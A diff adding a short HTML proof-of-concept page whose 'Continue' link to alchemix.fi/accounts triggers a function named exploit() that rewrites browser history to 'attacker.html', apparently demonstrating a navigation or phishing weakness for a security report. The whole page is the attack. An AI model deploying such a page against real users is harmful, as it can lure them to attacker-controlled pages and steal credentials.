@@ -1,0 +1,13 @@
+<html>
+  <head>
+    <title>Continue</title>
+  </head>
+  <body>
+    <a onclick="exploit()" href="https://alchemix.fi/accounts">Continue...</a>
+    <script>
+      function exploit() {
+        history.replaceState({ page: 1 }, "Exploit", "attacker.html");
+      }
+    </script>
+  </body>
+</html>
